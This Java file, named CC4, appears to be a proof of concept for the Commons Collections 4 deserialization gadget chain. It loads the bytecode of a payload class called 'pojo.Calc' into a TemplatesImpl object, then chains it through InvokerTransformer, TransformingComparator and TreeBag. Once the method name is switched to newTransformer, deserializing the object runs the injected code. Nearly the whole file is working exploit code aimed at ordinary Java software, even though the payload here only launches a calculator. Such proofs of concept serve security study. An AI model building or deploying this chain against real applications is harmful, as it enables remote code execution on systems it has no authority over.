import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;

import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import static utils.ReflectUtils.setFieldValue;
import static utils.SerializeUtils.serialize;
import static utils.SerializeUtils.unserialize;

public class CC4 {
    public static void main(String[] args) throws Exception {
        // javassist 动态加载pojo.Calc类，并转成字节码
        byte[] code = ClassPool.getDefault().get("pojo.Calc").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_name","RoboTerh");
        setFieldValue(obj,"_class",null);
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(obj,"_bytecodes",new byte[][]{code});

        InvokerTransformer transformer = new InvokerTransformer("toString", null, null);

        TransformingComparator transformingComparator = new TransformingComparator(transformer);
        //创建TreeBag对象
        TreeBag treeBag = new TreeBag(transformingComparator);
        treeBag.add(obj);
        //更改调用方法
        setFieldValue(transformer, "iMethodName", "newTransformer");

//        serialize(treeBag);
        unserialize();
    }
}
